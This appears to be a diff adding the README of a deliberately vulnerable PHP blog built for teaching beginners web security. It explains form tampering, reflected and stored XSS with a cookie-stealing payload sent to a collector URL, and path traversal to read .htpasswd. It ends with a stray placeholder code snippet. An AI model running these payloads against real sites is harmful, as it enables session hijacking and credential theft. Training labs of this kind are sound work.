@@ -1,0 +1,66 @@
+<h1>Fake blog to hack for newbie training</h1>
+
+<h2>Overview</h2>
+
+<p>This is a fake blog that has many kinds of web vulnerabilities. This is usefull because it can be use to teach to newbies that web vulnerabilities exist and can be very damaging.</p>
+
+<h2>Warning</h2>
+
+<p>It can be installed on a typical LAMP installation. You MUST NOT installed it on a production server or any server or network that should not be compromised. REMEMBER that the vulnerabilities on this application are REAL VULNERABILITIES. I am NOT RESPONSIBLE for what you do with it. </p>
+
+<h2>How to install it</h2>
+
+<p>The <code>blog_hack/</code> directory or the content of it have to be downloaded to your Apache <code>www</code> directory. Often, it is located to <code>/var/www/</code> on GNU/Linux system. </p>
+
+<p>You should edit the <code>blog_hack/init.php</code> file with your MySQL information. The default password of the admin user is <code>salut123</code>.</p>
+
+<p>The <code>blog_hack/admin</code> directory has an <code>.htpasswd</code> file. The <code>admin</code> user password is <code>admin</code>. If you want to modify it, you must encrypt it if you are on GNU/Linux because Apache force to do so.</p>
+
+<h2>How to use it</h2>
+
+<p>Here is a list of all vulnerabilities on this blog. If you don't want to know them because you want to discover them by yourself, you should stop reading this right now and begin to play with the application. Remember, you're not supposed to know the default credentials mentionned above.</p>
+
+<h3>Form validation vulnerability</h3>
+
+<p>First of all, there is a form validation vulnerability in the subscription form. What you have to do is to submit the first form with "Level 1" account and then you arrive on a second page which is a hidden form. If you check the source, you'll see that there is a <code>type</code> field and a <code>total</code> field. So if you check in the first form for the values, you'll see that the value for the level 2 is 2. But here's the trick, you have to modify the <code>type</code> field in the second form with a value of 3 instead of 1 or 2 and you must not modify the <code>total</code> field because, in the validation, only the <code>total</code> field is validated but not the <code>type</code> field but what's inserted in the DB is the <code>type</code> field. Then, you submit the hidden form. You normally should be able to comment on blog article.</p>
+
+<h3>XSS vulnerability</h3>
+
+<p>A XSS (means Cross-site scripting) vulnerability is a vulnerability that permits the user to inject some Javascript in a web page. Mainly, if you discover a XSS in a web site, you're able to steal user cookies, use them to connect to the web site as them and having access of all information that the user has access.</p>
+
+<h4>Non-persistent XSS</h4>
+
+<p>In the blog members list, you can search for members on the web site. If you enter quotes in the search field, you can end the html input tag and begin a script tag.</p>
+
+<p>In the root directory of this repo, there is a <code>cookies.php</code> file and a <code>cookies.html</code> file. You have to download these 2 files to the web server of your choice. You can choose the same web server that you put the <code>blog_hack</code> site. Basically, what the <code>cookies.php</code> file does is to take a GET request with a parameter named <code>c</code> and writes it to the <code>cookies.html</code> file. You have to be sure that the <code>cookies.php</code> script has rights to write to the <code>cookies.html</code> file. I don't know the exact right that these files need to have so you can do a <code>chmod 777 cookies.php cookies.html</code> to be sure. You also can do that via FTP if you want.</p>
+
+<p>So, all is in place. Let's the hacking begin! The goal of the manipulations here is to create an URL to send to a user that will redirect him to the <code>cookies.php</code> file with his cookie in the <code>c</code> parameter. Here is what you have to enter in the search field: <code>"&gt; &lt;script&gt;document.location = "http://yourdomain/your/path/cookies.php?c=" %2b document.cookie;&lt;/script&gt;</code>. The <code>%2b</code> is simply url encoded version of the <code>+</code> character; if we don't url encode it, it will be replaced by a space by your web browser if you enter it in the URL bar instead of the search field. If you enter it in your browser, you'll send your own cookies to you. Normally, the goal is to send an URL that contains this search to a user but this is not covered in this demonstration.</p>
+
+<h4>Persistent XSS</h4>
+
+<p>A persistent XSS is exactly the same as a non-persistent XSS except that the persistent XSS is inserted in a DB and all user that arrive on a certain page will be victim of the XSS. So, there is a persitent XSS in the comment section of each blog entry. The exploit technique is absolutly the same except you don't have to send a URL to a user and just wait that someone came to the page.</p>
+
+<h3>File inclusion vulnerability</h3>
+
+<p>File inclusion vulnerabilities are vulnerabilities that can able an attacker to include a file not supposed to be include in the page. A classic example of this vulnerablity is a web site that take a parameter <code>page</code> in the URL to show the good page to the client. The URL usually looks like <code>http://mywebsite.com/index.php?page=home.php</code>. So, if the developper didn't secure his function, it is possible to include many files often on the server itself. More rarely, you could be able to include an external file and then execute the content of this file by PHP so doing what you want on the server.</p>
+
+<p>So, what do we have here? There is a <code>page</code> parameter. If you try to write anyting else in this parameter, you'll see that the <code>.php</code> is added at the end of the include function. It's not very convenient. Also, you can notice that you're not able to include external files because the include file begin with <code>./include/</code>. But, if we look for vulnerabilities in the include function of PHP, we'll find that <code>include</code> had a vulnerability, in old version of PHP, that permitted to skip the end of the include string by inserting a NULL byte in the string because PHP stopped reading the string if it read a NULL byte. </p>
+
+<p>So now, we know we can possibly* include any files on the web server if the user that executes PHP has the right to read these. Of course, if the system administrators are very dump, we could read the <code>/etc/shadow</code> and <code>/etc/passwd</code> files. But let's suppose they're not for the case here. If you do some tests on the website, you may have discovered there is a <code>admin/</code> URL with a username and a password. So, to discover what are the credentials, we use the file inclusion vulnerability we discovered and we do an URL like this: <code>index.php?page=../admin/.htpasswd</code>. And boom, we now have a hashed version of the admin user password. You can now use any tool that crack hashes and will discover that the password is <code>admin</code>.</p>
+
+<p>To explain the URL, the first two dots (<code>../</code>) are there because if you remember the include string was begining with <code>./include/</code> so we need to come back because we want to go in the <code>./admin/</code> directory and not the <code>./include/admin/</code> directory. Finally, the <code>.htpasswd</code> file is the standard file for Apache HTTP password configuration (Htaccess).</p>
+
+<p>* In this case, this vulnerability is simulated. This is the only simulated vulnerability because this vulnerability has already existed but is not anymore available.</p>
+
+<h3>SQL injection</h3>
+
+<p>The goal of this vulnerability is to inject SQL statement into SQL queries that are not intended to. To be able to exploit SQL injection, you have to know some basis of SQL. A classic SQL injection is when you have a login form that don't escape character in the username. Let's think how the SQL query might be build to verify if the user and the password match; ``.</p>
+
+<p><code>python
+"SELECT * FROM users WHERE login = '".$_POST['login']."' AND password='".$_POST['password']."'"
+</code></p>
+
+<p><code>python
+  s = "Python syntax highlighting"
+   print s
+</code></p>
